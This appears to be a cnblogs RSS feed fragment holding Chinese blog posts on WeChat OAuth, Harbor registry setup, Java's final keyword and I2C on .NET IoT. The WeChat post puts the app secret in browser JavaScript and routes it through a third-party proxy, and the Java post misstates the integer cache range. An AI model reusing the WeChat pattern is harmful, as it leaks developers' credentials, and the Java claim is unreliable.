<pubDate>Wed, 22 May 2019 15:30:00 +0000</pubDate>
<dc:creator>龙恩0707</dc:creator>
<og:description>web安全之XSS攻击原理及防范</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tugenhua0707/p/10909284.html</dc:identifier>
</item>
<item>
<title>微信网页授权——获取code、access_token、openid，及跨域问题解决 - 候郑青</title>
<link>http://www.cnblogs.com/hou-zheng-qing/p/10909256.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hou-zheng-qing/p/10909256.html</guid>
<description>&lt;p&gt;首先在微信开发文档中有提到微信网页授权的操作步骤：&lt;/p&gt;
&lt;p&gt;第一步：用户同意授权，获取code&lt;/p&gt;
&lt;p&gt;在确保微信公众账号拥有授权作用域（scope参数）的权限的前提下（服务号获得高级接口后，默认拥有scope参数中的snsapi_base和snsapi_userinfo），引导关注者打开如下页面：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;amp;redirect_uri = REDIRECT_URL&amp;amp;response_type=code&amp;amp;scope=SCOPE&amp;amp;state=STATE#wechat_redirect&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;其中scope有静默授权和非静默授权两种，在这里我们使用非静默授权：scope等于snsapi_userinfo，为后面获取用户信息做准备。&lt;/p&gt;
&lt;p&gt;如果用户同意授权，页面将跳转至 redirect_uri/?code=CODE&amp;amp;state=STATE。&lt;/p&gt;
&lt;p&gt;code说明：&lt;strong&gt;&lt;span&gt;code作为换取access_token的票据，每次用户授权带上的code将不一样，code只能使用一次，5分钟未被使用自动过期。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第二步：通过code换取网页授权access_token&lt;/p&gt;
&lt;p&gt;获取code后，请求以下链接获取access_token： https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;amp;secret=SECRET&amp;amp;code=CODE&amp;amp;grant_type=authorization_code&lt;br/&gt;但是在获取access_token的过程中，我们会遇到一个跨域问题，什么post、get和jsonp方法都试过了，都不行，那么怎么解决这个跨域问题呢？&lt;/p&gt;
&lt;p&gt;首先我们知道我们是不可能改变微信的代码，那么我们就只能想到的解决方法是利用别人的代理来进行中转，那么从网上找到了如下方法：&lt;/p&gt;
&lt;pre&gt;
&lt;strong&gt;&lt;span&gt;var target = &quot;https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;amp;secret=AECRET&amp;amp;code=&quot;+value+&quot;&amp;amp;grant_type=authorization_code&quot;;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;$.ajax({//2.通过code换取网页授权access_token&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;    url: 'http://query.yahooapis.com/v1/public/yql',//雅虎代理url&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;    dataType: &quot;jsonp&quot;,//雅虎代理数据格式&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;    data:{&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;        q:&quot;select * from json where url=\'&quot;+target+&quot;'&quot;,&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;        //代理返回格式&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;        format:&quot;json&quot;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;    },&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;    success: function (data) {&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;        alert(&quot;请求成功&quot;);&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;        alert(&quot;openid:&quot;+data.query.results.json.openid);&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;        console.log(&quot;openid:&quot;+data.query.results.json.openid);&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;    }&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;});&lt;/span&gt;&lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;以上的用的就是yahoo的代理ypl进行一个中转，ypl是雅虎旗下一个用来转换数据的，从而获取到了access_token和openid。&lt;/p&gt;
</description>
<pubDate>Wed, 22 May 2019 15:24:00 +0000</pubDate>
<dc:creator>候郑青</dc:creator>
<og:description>首先在微信开发文档中有提到微信网页授权的操作步骤： 第一步：用户同意授权，获取code 在确保微信公众账号拥有授权作用域（scope参数）的权限的前提下（服务号获得高级接口后，默认拥有scope参数中</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hou-zheng-qing/p/10909256.html</dc:identifier>
</item>
<item>
<title>Docker私服仓库Harbor安装 - 木木在唱歌</title>
<link>http://www.cnblogs.com/yal950727/p/10909221.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yal950727/p/10909221.html</guid>
<description>&lt;p&gt;Harbor安装那里还是很简单,就是在Docker Login那里掉坑里去了,搞半天,写博客的时候,又重新安装了一遍&lt;br/&gt;&lt;img src=&quot;https://hexosrc.oss-cn-shenzhen.aliyuncs.com/blog/20190522230838.jpg&quot;/&gt;&lt;br/&gt;&lt;/p&gt;

&lt;p&gt;centos7&lt;br/&gt;harbor 10.19.46.15&lt;br/&gt;client 10.19.44.31&lt;/p&gt;

&lt;h2 id=&quot;docker安装&quot;&gt;Docker安装&lt;/h2&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;yum install -y yum-utils device-mapper-persistent-data lvm2
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
yum -y install docker-ce
systemctl start docker&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;docker-compose-安装&quot;&gt;Docker Compose 安装&lt;/h2&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;yum install epel-release
yum install -y python-pip
pip install docker-compose
yum install git&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;harbor1.8-下载&quot;&gt;harbor1.8 下载&lt;/h2&gt;
&lt;p&gt;https://github.com/goharbor/harbor/releases&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexosrc.oss-cn-shenzhen.aliyuncs.com/blog/20190522225917.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;解压出来&quot;&gt;解压出来&lt;/h2&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[root@harbor harbor]# ll
总用量 32
-rw-r--r--. 1 root root  4519 5月  21 15:59 harbor.yml
-rwxr-xr-x. 1 root root  5088 5月  21 15:59 install.sh
-rw-r--r--. 1 root root 11347 5月  21 15:59 LICENSE
-rwxr-xr-x. 1 root root  1654 5月  21 15:59 prepare&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;修改harbor.yml&quot;&gt;修改harbor.yml&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;hostname 这里设置本机的ip&lt;/li&gt;
&lt;li&gt;harbor_admin_password web页面的密码&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;运行&quot;&gt;运行&lt;/h2&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;sh ./install.sh&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;安装成功&quot;&gt;安装成功&lt;/h2&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;......
Status: Downloaded newer image for goharbor/harbor-registryctl:v1.8.0
Creating harbor-log ... done
Creating harbor-db   ... done
Creating registry    ... done
Creating redis       ... done
Creating registryctl ... done
Creating harbor-core ... done
Creating harbor-jobservice ... done
Creating harbor-portal     ... done
Creating nginx             ... done

✔ ----Harbor has been installed and started successfully.----

Now you should be able to visit the admin portal at http://10.19.46.15. 
For more details, please visit https://github.com/goharbor/harbor .&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;访问页面&quot;&gt;访问页面&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;http://10.19.46.15&lt;/code&gt;&lt;br/&gt;&lt;img src=&quot;https://hexosrc.oss-cn-shenzhen.aliyuncs.com/blog/20190522225919.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;如果想要停止或者是服务器重启了需要手动重启在harbor的安装目录里执行命令&quot;&gt;如果想要停止,或者是服务器重启了,需要手动重启,在harbor的安装目录,里执行命令&lt;/h2&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[root@harbor harbor]# ll
总用量 40
drwxr-xr-x. 3 root root    20 5月  22 22:24 common
-rw-r-----. 1 root root  5183 5月  22 22:24 docker-compose.yml
-rw-r--r--. 1 root root  4514 5月  22 22:23 harbor.yml
-rwxr-xr-x. 1 root root  5088 5月  21 15:59 install.sh
-rw-r--r--. 1 root root 11347 5月  21 15:59 LICENSE
-rwxr-xr-x. 1 root root  1654 5月  21 15:59 prepare

# 停止
[root@harbor harbor]# docker-compose stop
Stopping nginx             ... done
Stopping harbor-portal     ... done
Stopping harbor-jobservice ... done
Stopping harbor-core       ... done
Stopping registryctl       ... done
Stopping redis             ... done
Stopping registry          ... done
Stopping harbor-db         ... done
Stopping harbor-log        ... done

# 运行
[root@harbor harbor]# docker-compose start
Starting log         ... done
Starting postgresql  ... done
Starting redis       ... done
Starting registry    ... done
Starting core        ... done
Starting jobservice  ... done
Starting portal      ... done
Starting proxy       ... done
Starting registryctl ... done&lt;/code&gt;
&lt;/pre&gt;

&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[root@client ~]# docker login 10.19.46.15
Username: admin
Password: 
Error response from daemon: Get https://10.19.46.15/v2/: dial tcp 10.19.46.15:443: connect: connection refused&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这是因为docker1.3.2版本开始默认docker registry使用的是https，我们设置Harbor默认http方式，所以当执行用docker login、pull、push等命令操作非https的docker regsitry的时就会报错。&lt;/p&gt;

&lt;p&gt;在harbor那台服务器,在harbor的安装目录&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;vim docker-compose.yml&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexosrc.oss-cn-shenzhen.aliyuncs.com/blog/20190522225920.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后同时编辑harbor和client的docker配置文件,&lt;code&gt;10.19.46.15 是harbor的ip地址&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;# 1.
vim /etc/docker/daemon.json

{
    &quot;insecure-registries&quot;: [
        &quot;10.19.46.15&quot;
    ]
}

# 2.添加ExecStart=/usr/bin/dockerd  |--insecure-registry=10.19.46.15
vim /usr/lib/systemd/system/docker.service

# 把这行注释掉,添加下面的配置 ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
ExecStart=/usr/bin/dockerd
                |--insecure-registry=10.19.46.15&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;1.重启harbor 的 docker-compose,命令文上有&lt;br/&gt;2.重启docker&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt; systemctl daemon-reload
systemctl restart docker&lt;/code&gt;
&lt;/pre&gt;

&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[root@client ~]# docker login 10.19.46.15   
Username: admin
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store
Login Succeeded&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;pull 的命令&lt;br/&gt;&lt;img src=&quot;https://hexosrc.oss-cn-shenzhen.aliyuncs.com/blog/20190522225918.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;推送和打tag的命令&lt;br/&gt;&lt;img src=&quot;https://hexosrc.oss-cn-shenzhen.aliyuncs.com/blog/20190522225921.png&quot;/&gt;&lt;/p&gt;

&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;harbor的安装:https://blog.csdn.net/weixin_42082634/article/details/82850298&lt;br/&gt;更多可访问我的博客:https://yanganlin.com&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Wed, 22 May 2019 15:18:00 +0000</pubDate>
<dc:creator>木木在唱歌</dc:creator>
<og:description>Harbor安装那里还是很简单,就是在Docker Login那里掉坑里去了,搞半天,写博客的时候,又重新安装了一遍 &lt;! more 1.准备两台服务器 centos7 harbor 10.19.46</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yal950727/p/10909221.html</dc:identifier>
</item>
<item>
<title>探究final在java中的作用 - 炭烧生蚝</title>
<link>http://www.cnblogs.com/tanshaoshenghao/p/10908771.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tanshaoshenghao/p/10908771.html</guid>
<description>&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;final关键字的字面意思是最终的, 不可修改的. 这似乎是一个看见名字就大概能知道怎么用的语法, 但你是否有深究过final在各个场景中的具体使用方法, 注意事项, 以及背后涉及的Java设计思想呢?&lt;/p&gt;
&lt;/blockquote&gt;


&lt;h2 id=&quot;基础-final修饰基本数据类型变量和引用数据类型变量.&quot;&gt;1. 基础: final修饰基本数据类型变量和引用数据类型变量.&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;相信大家都具备基本的常识: 被final修饰的变量是不能够被改变的. 但是这里的&quot;不能够被改变&quot;对于不同的数据类型是有不同的含义的.&lt;/li&gt;
&lt;li&gt;当final修饰的是一个基本数据类型数据时, 这个数据的值在初始化后将不能被改变; 当final修饰的是一个引用类型数据时, 也就是修饰一个对象时, 引用在初始化后将永远指向一个内存地址, 不可修改. 但是该内存地址中保存的对象信息, 是可以进行修改的.&lt;/li&gt;
&lt;li&gt;上一段话可能比较抽象, 希望下面的图能有助于你理解, 你会发现虽说有不同的含义, 但本质还是一样的.&lt;/li&gt;
&lt;li&gt;首先是final修饰基本数据类型时的内存示意图&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190522153415318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTM1Nzc2Nw==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如上图, 变量a在初始化后将永远指向003这块内存, 而这块内存在初始化后将永远保存数值100.&lt;/li&gt;
&lt;li&gt;下面是final修饰引用数据类型的示意图&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2019052215343156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTM1Nzc2Nw==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在上图中, 变量p指向了0003这块内存, 0003内存中保存的是对象p的句柄(存放对象p数据的内存地址), 这个句柄值是不能被修改的, 也就是变量p永远指向p对象. 但是p对象的数据是可以修改的.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 代码示例
public static void main(String[] args) {
    final Person p = new Person(20, &quot;炭烧生蚝&quot;);
    p.setAge(18);   //可以修改p对象的数据
    System.out.println(p.getAge()); //输出18

    Person pp = new Person(30, &quot;蚝生烧炭&quot;);
    p = pp; //这行代码会报错, 不能通过编译, 因为p经final修饰永远指向上面定义的p对象, 不能指向pp对象. 
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;不难看出final修饰变量的&lt;strong&gt;本质&lt;/strong&gt;: final修饰的变量会指向一块固定的内存, 这块内存中的值不能改变.&lt;/li&gt;
&lt;li&gt;引用类型变量所指向的对象之所以可以修改, 是因为引用变量不是直接指向对象的数据, 而是指向对象的引用的. 所以被final修饰的引用类型变量将永远指向一个固定的对象, 不能被修改; 对象的数据值可以被修改.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;进阶-被final修饰的常量在编译阶段会被放入常量池中&quot;&gt;2. 进阶: 被final修饰的常量在编译阶段会被放入常量池中&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;final是用于定义常量的, 定义常量的好处是: 不需要重复地创建相同的变量. 而常量池是Java的一项重要技术, 由final修饰的变量会在编译阶段放入到调用类的常量池中.&lt;/li&gt;
&lt;li&gt;请看下面这段演示代码. 这个示例是专门为了演示而设计的, 希望能方便大家理解这个知识点.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public static void main(String[] args) {
    int n1 = 2019;          //普通变量
    final int n2 = 2019;    //final修饰的变量

    String s = &quot;20190522&quot;;  
    String s1 = n1 + &quot;0522&quot;;    //拼接字符串&quot;20190512&quot;
    String s2 = n2 + &quot;0522&quot;;    

    System.out.println(s == s1);    //false
    System.out.println(s == s2);    //true
}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;首先要介绍一点: 整数-127-128是默认加载到常量池里的, 也就是说如果涉及到-127-128的整数操作, 默认在编译期就能确定整数的值. 所以这里我故意选用数字2019(大于128), 避免数字默认就存在常量池中.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;上面的代码运作过程是这样的:&lt;/li&gt;
&lt;li&gt;首先根据final修饰的常量会在编译期放到常量池的原则, n2会在编译期间放到常量池中.&lt;/li&gt;
&lt;li&gt;然后s变量所对应的&quot;20190522&quot;字符串会放入到字符串常量池中, 并对外提供一个引用返回给s变量.&lt;/li&gt;
&lt;li&gt;这时候拼接字符串s1, 由于n1对应的数据没有放入常量池中, 所以s1暂时无法拼接, 需要等程序加载运行时才能确定s1对应的值.&lt;/li&gt;
&lt;li&gt;但在拼接s2的时候, 由于n2已经存在于常量池, 所以可以直接与&quot;0522&quot;拼接, 拼接出的结果是&quot;20190522&quot;. 这时系统会查看字符串常量池, 发现已经存在字符串20190522, 所以直接返回20190522的引用. 所以s2和s指向的是同一个引用, 这个引用指向的是字符串常量池中的20190522.&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;&lt;li&gt;当程序执行时, n1变量才有具体的指向.&lt;/li&gt;
&lt;li&gt;当拼接s1的时候, 会创建一个新的String类型对象, 也就是说字符串常量池中的20190522会对外提供一个新的引用.&lt;/li&gt;
&lt;li&gt;所以当s1与s用&quot;==&quot;判断时, 由于对应的引用不同, 会返回false. 而s2和s指向同一个引用, 返回true.&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;总结: 这个例子想说明的是: 由于被final修饰的常量会在编译期进入常量池, 如果有涉及到该常量的操作, 很有可能在编译期就已经完成.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;探索-为什么局部匿名内部类在使用外部局部变量时-只能使用被final修饰的变量&quot;&gt;3. 探索: 为什么局部/匿名内部类在使用外部局部变量时, 只能使用被final修饰的变量?&lt;/h2&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;提示: 在JDK1.8以后, 通过内部类访问外部局部变量时, 无需显式把外部局部变量声明为final. 不是说不需要声明为final了, 而是这件事情在编译期间系统帮我们做了. 但是我们还是有必要了解为什么要用final修饰外部局部变量.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Outter {
    public static void main(String[] args) {
        final int a = 10;
        new Thread(){
            @Override
            public void run() {
                System.out.println(a);
            }
        }.start();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;在上面这段代码, 如果没有给外部局部变量a加上final关键字, 是无法通过编译的. 可以试着想想: 当main方法已经执行完后, main方法的栈帧将会弹出, 如果此时Thread对象的生命周期还没有结束, 还没有执行打印语句的话, 将无法访问到外部的a变量.&lt;/li&gt;
&lt;li&gt;那么为什么加上final关键字就能正常编译呢? 我们通过查看反编译代码看看内部类是怎样调用外部成员变量的.&lt;/li&gt;
&lt;li&gt;我们可以先通过javac编译得到.class文件(用IDE编译也可以), 然后在命令行输入&lt;code&gt;javap -c .class文件的绝对路径&lt;/code&gt;, 就能查看.class文件的反编译代码. 以上的Outter类经过编译产生两个.class文件, 分别是&lt;code&gt;Outter.class和Outter$1.class&lt;/code&gt;, 也就是说内部类会单独编译成一个.class文件. 下面给出&lt;code&gt;Outter$1.class&lt;/code&gt;的反编译代码.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Compiled from &quot;Outter.java&quot;
final class forTest.Outter$1 extends java.lang.Thread {
  forTest.Outter$1();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Thread.&quot;&amp;lt;init&amp;gt;&quot;:()V
       4: return

  public void run();
    Code:
       0: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;
       3: bipush        10
       5: invokevirtual #3                  // Method java/io/PrintStream.println:(I)V
       8: return
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;定位到&lt;code&gt;run()&lt;/code&gt;方法反编译代码中的第3行:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;3: bipush 10&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;我们看到a的值在内部类的&lt;code&gt;run()&lt;/code&gt;方法执行过程中是以压栈的形式存储到本地变量表中的, 也就是说在内部类打印变量a的值时, 这个变量a不是外部的局部变量a, 因为如果是外部局部变量的话, 应该会使用&lt;code&gt;load&lt;/code&gt;指令加载变量的值. 也就是说系统以拷贝的形式把外部局部变量a复制了一个副本到内部类中, 内部类有一个变量指向外部变量a所指向的值.&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;&lt;li&gt;但研究到这里好像和final的关系还不是很大, 不加final似乎也可以拷贝一份变量副本, 只不过不能在编译期知道变量的值罢了. 这时该思考一个新问题了: 现在我们知道内部类的变量a和外部局部变量a是两个完全不同的变量, 那么如果在执行run()方法的过程中, 内部类中修改了a变量所指向的值, 就会产生数据不一致问题.&lt;/li&gt;
&lt;li&gt;正因为我们的原意是内部类和外部类访问的是同一个a变量, 所以当在内部类中使用外部局部变量的时候应该用final修饰局部变量, 这样局部变量a的值就永远不会改变, 也避免了数据不一致问题的发生.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;&lt;li&gt;使用final修饰方法有两个作用, 首要作用是锁定方法, 不让任何继承类对其进行修改.&lt;/li&gt;
&lt;li&gt;另外一个作用是在编译器对方法进行内联, 提升效率. 但是现在已经很少这么使用了, 近代的Java版本已经把这部分的优化处理得很好了. 但是为了满足求知欲还是了解一下什么是方法内敛.&lt;/li&gt;
&lt;li&gt;方法内敛: 当调用一个方法时, 系统需要进行保存现场信息, 建立栈帧, 恢复线程等操作, 这些操作都是相对比较耗时的. 如果使用final修饰一个了一个方法a, 在其他调用方法a的类进行编译时, 方法a的代码会直接嵌入到调用a的代码块中.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//原代码
public static void test(){
    String s1 = &quot;包夹方法a&quot;;
    a();
    String s2 = &quot;包夹方法a&quot;;
}

public static final void a(){
    System.out.println(&quot;我是方法a中的代码&quot;);
    System.out.println(&quot;我是方法a中的代码&quot;);
}

//经过编译后
public static void test(){
    String s1 = &quot;包夹方法a&quot;;
    System.out.println(&quot;我是方法a中的代码&quot;);
    System.out.println(&quot;我是方法a中的代码&quot;);
    String s2 = &quot;包夹方法a&quot;;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;在方法非常庞大的时候, 这样的内嵌手段是几乎看不到任何性能上的提升的, 在最近的Java版本中，不需要使用final方法进行这些优化了. --《Java编程思想》&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;&lt;li&gt;使用final修饰类的目的简单明确: 表明这个类不能被继承.&lt;/li&gt;
&lt;li&gt;当程序中有永远不会被继承的类时, 可以使用final关键字修饰&lt;/li&gt;
&lt;li&gt;被final修饰的类所有成员方法都将被隐式修饰为final方法.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt; &lt;br/&gt; &lt;/p&gt;
&lt;ul&gt;&lt;li&gt;参考资料&lt;/li&gt;
&lt;li&gt;https://www.cnblogs.com/ChenLLang/p/5316662.html&lt;/li&gt;
&lt;li&gt;http://www.cnblogs.com/xrq730/p/4857820.html&lt;/li&gt;
&lt;li&gt;https://gitbook.cn/books/5c6e1937c73f4717175f7477/index.html&lt;/li&gt;
&lt;li&gt;http://www.cnblogs.com/xrq730/p/4844915.html&lt;/li&gt;
&lt;li&gt;http://www.cnblogs.com/dolphin0520/p/3811445.html&lt;/li&gt;
&lt;li&gt;https://www.cnblogs.com/dolphin0520/p/3736238.html&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;
&lt;ul&gt;&lt;li&gt;最后欢迎关注我的&lt;strong&gt;免费&lt;/strong&gt;知识星球, 我会在星球中持续更新系统的Java后端面试题分析, 将会囊括Java基础知识到主流框架原理. 还会分享关于编程的趣味漫画.&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/tanshaoshenghao/1426602/o_%e6%98%9f%e7%90%832.png&quot;/&gt;</description>
<pubDate>Wed, 22 May 2019 13:51:00 +0000</pubDate>
<dc:creator>炭烧生蚝</dc:creator>
<og:description>[toc] final关键字的字面意思是最终的, 不可修改的. 这似乎是一个看见名字就大概能知道怎么用的语法, 但你是否有深究过final在各个场景中的具体使用方法, 注意事项, 以及背后涉及的Jav</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tanshaoshenghao/p/10908771.html</dc:identifier>
</item>
<item>
<title>张高兴的 .NET Core IoT 入门指南：（三）使用 I2C 进行通信 - 张高兴</title>
<link>http://www.cnblogs.com/zhanggaoxing/p/10908670.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhanggaoxing/p/10908670.html</guid>
<description>&lt;h2 id=&quot;什么是-i2c-总线&quot;&gt;什么是 I&lt;sup&gt;2&lt;/sup&gt;C 总线&lt;/h2&gt;
&lt;p&gt;I&lt;sup&gt;2&lt;/sup&gt;C 总线（Inter-Integrated Circuit Bus）是设备与设备间通信方式的一种。它是一种串行通信总线，由飞利浦公司在1980年代为了让主板、嵌入式系统或手机用以连接低速周边设备而发展&lt;sup&gt;&lt;a href=&quot;https://baike.baidu.com/item/iic/3524834&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;。I&lt;sup&gt;2&lt;/sup&gt;C 总线包含两根信号线，一根为信号线 SDA ，另一根为时钟线 SCL 。总线上可以挂载多个设备，以 7 位 I&lt;sup&gt;2&lt;/sup&gt;C 地址为例，总线上最多可以挂载 2&lt;sup&gt;7&lt;/sup&gt; - 1 个设备，即 127 个，地址 0x00 不用（类似于网络中的广播地址）。I&lt;sup&gt;2&lt;/sup&gt;C 还包括一个子集叫 SMBus （System Management Bus），是 1995 年由 Intel 提出的&lt;sup&gt;&lt;a href=&quot;https://baike.baidu.com/item/SMBus/1190006&quot;&gt;[2]&lt;/a&gt;&lt;/sup&gt;。为什么说是子集，是因为 SMBus 是 I&lt;sup&gt;2&lt;/sup&gt;C 的简化版，电气特性和传输速率等方面上略有不同。下图展示了一个 I&lt;sup&gt;2&lt;/sup&gt;C 主设备和三个 I&lt;sup&gt;2&lt;/sup&gt;C 从设备的示意图，总线上只能有一个主设备，而通常情况下你的主机（如 Raspberry Pi，Arduino）就是主设备，传感器为从设备。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1085877/201905/1085877-20190522213235190-237434343.png&quot;/&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;small&gt;图源：&lt;a href=&quot;https://zh.wikipedia.org/wiki/File:I2C.svg&quot;&gt;Wikipedia&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;I&lt;sup&gt;2&lt;/sup&gt;C 总线也并不是那么完美。因为 I&lt;sup&gt;2&lt;/sup&gt;C 只有两根信号线，与 SPI 的四根信号线相比，传输速率上并不占优，而且数据在同一时间内只能向一个方向传输。但反过来看，I&lt;sup&gt;2&lt;/sup&gt;C 总线的最大优点是只需要占用两个 IO 接口，在单片机等 IO 接口数量较少的设备上也算是一种优势吧。&lt;/p&gt;
